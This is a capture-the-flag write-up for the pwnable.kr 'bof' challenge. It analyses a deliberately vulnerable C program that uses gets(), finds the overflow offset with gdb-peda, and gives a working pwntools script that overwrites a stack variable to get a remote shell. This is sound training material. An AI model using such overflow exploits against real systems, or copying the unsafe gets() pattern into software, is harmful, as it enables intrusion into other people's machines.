# [pwnable.kr](http://pwnable.kr/play.php) - bof Challenge
![](pwnable.kr-website.png)
## 1.1 Getting resource
```sh
$ wget http://pwnable.kr/bin/bof && wget http://pwnable.kr/bin/bof.c
```
```bash
th3knight$wget http://pwnable.kr/bin/bof && wget http://pwnable.kr/bin/bof.c
--2022-01-09 17:45:49--  http://pwnable.kr/bin/bof
Resolving pwnable.kr (pwnable.kr)... 128.61.240.205
Connecting to pwnable.kr (pwnable.kr)|128.61.240.205|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7348 (7,2K)
Saving to: ‘bof.2’

bof.2                         100%[=================================================>]   7,18K  --.-KB/s    in 0s

2022-01-09 17:45:50 (526 MB/s) - ‘bof.2’ saved [7348/7348]

--2022-01-09 17:45:50--  http://pwnable.kr/bin/bof.c
Resolving pwnable.kr (pwnable.kr)... 128.61.240.205
Connecting to pwnable.kr (pwnable.kr)|128.61.240.205|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 308 [text/x-csrc]
Saving to: ‘bof.c.2’

bof.c.2                       100%[=================================================>]     308  --.-KB/s    in 0s

2022-01-09 17:45:50 (18,1 MB/s) - ‘bof.c.2’ saved [308/308]
```

## 1.2 Overflowing the program
### 1.2.1 Reading and analysis the source code
First up, we need to see what is in the code
```bash
$ cat bof.c
```
```c
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
We see that, in the main function inputted is `0xdeadbeef`
```c
int main(int argc, char* argv[]){
        func(0xdeadbeef); // <=== Here
        return 0;
}
```

and in `func()`, there is an array with `char overflowme[32]` and have a risk function called from lib is `gets()` with the note: smash me!
```c
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
```
and if the key (which is `0xdeadbeef`) is `0xcafebabe`, there would be system call the `sh` binary
```c
if(key == 0xcafebabe){
	system("/bin/sh");
}
```
### 1.2.2 Debugging program and find the offset to overflow & override the key.
In here i will use the gdb debugger to the bug the program
```bash
th3knight$gdb -q bof
Reading symbols from bof...
(No debugging symbols found in bof)
gdb-peda$
```
In here, the output of mine might different than yours because i've already installed the [Peda](https://github.com/longld/peda)
Let's disassembly the main
```powershell
gdb-peda$ disas main

Dump of assembler code for function main:
   0x5655568a <+0>:     push   ebp
   0x5655568b <+1>:     mov    ebp,esp
   0x5655568d <+3>:     and    esp,0xfffffff0
   0x56555690 <+6>:     sub    esp,0x10
   0x56555693 <+9>:     mov    DWORD PTR [esp],0xdeadbeef
   0x5655569a <+16>:    call   0x5655562c <func>
   0x5655569f <+21>:    mov    eax,0x0
   0x565556a4 <+26>:    leave
   0x565556a5 <+27>:    ret
End of assembler dump.
```
In here, we could see in the address `0x56555693` : `0xdeadbeef` moved into pointer of ESP and then `call <func>`, let's disassembly the function `func` to see other intructions.
```powershell
gdb-peda$ disas func

Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x78c
   0x56555644 <+24>:    call   0x56555645 <func+25>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0x56555650 <func+36>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x79b
   0x56555664 <+56>:    call   0x56555665 <func+57>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x56555672 <+70>:    call   0x56555673 <func+71>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0x56555684 <func+88>
   0x56555688 <+92>:    leave
   0x56555689 <+93>:    ret
End of assembler dump.
```
In this function, I see the compare intruction `cmp  DWORD PTR [ebp+0x8],0xcafebabe` so i know this is `if(key == 0xcafebabe)` operation. Let's make a break point on it and create a pattern to overflow and get the offset.

Folowing to the workflow of the code, I know that `0x5655564f <+35>:  call   0x56555650 <func+36>` will be the `gets()`,  so I just make a breakpoint before and after calling it to see what happend.
```powershell
gdb-peda$ br *0x5655564c
Breakpoint 1 at 0x5655564c
gdb-peda$ br *0x56555654
Breakpoint 2 at 0x56555654
```
Creating the offset
```powershell
gdb-peda$ pattern create 100 1.txt
Writing pattern of 100 chars to filename "1.txt"
gdb-peda$ r < 1.txt
```
On the stop of break point 1, we use `x/100wx $esp` to show the esp, I got lots of result but can see that there is 0xdeadbeef overthere
```powershell
0xffffd210:     0xffffd22c      0x00000000      0xf7ffd000      0x00000000
0xffffd220:     0x00000000      0x00000000      0x56555034      0x5655573a
0xffffd230:     0x56556ff4      0xf7fa6000      0x00000001      0x5655549d
0xffffd240:     0xf7fa63fc      0xffffffff      0x56556ff4      0xbb15de00
0xffffd250:     0x56556ff4      0xf7fa6000      0xffffd278      0x5655569f
0xffffd260:     0xdeadbeef      0x00000000      0x565556b9      0x00000000 ; <===
```
Now we know the address `0xffffd260` has`0xdeadbeef`. Enter `c` or `continue` to continue and stop at the next breakpoint, let's show it's stack to get the offset and using the pattern offset of ![peda](https://github.com/longld/peda) to find the exact length
```powershell
gdb-peda$ x/x 0xffffd260
0xffffd260:     0x41474141
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
```

### 1.3 POC and getting the flag
We already know position of `0xdeadbeef`, it's beginning from word 52. I wrote a python script `poc.py` to make a buffer and send to the server following the instruction of the game `nc pwnable.kr 9000`. 
```python
#!/usr/bin/python3
import struct  
import pwn  
  
junk = b'A'*52  
key = struct.pack('<L', 0xcafebabe)  
overriden_key_buffer = junk + key  
connection = pwn.remote('pwnable.kr', 9000)  
connection.sendline(overriden_key_buffer)  
connection.interactive()
```
Executing the script:
```bash
th3knight$./poc.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag    <=== This is what we need
log
log2
super.pl
```
Thanks for reading
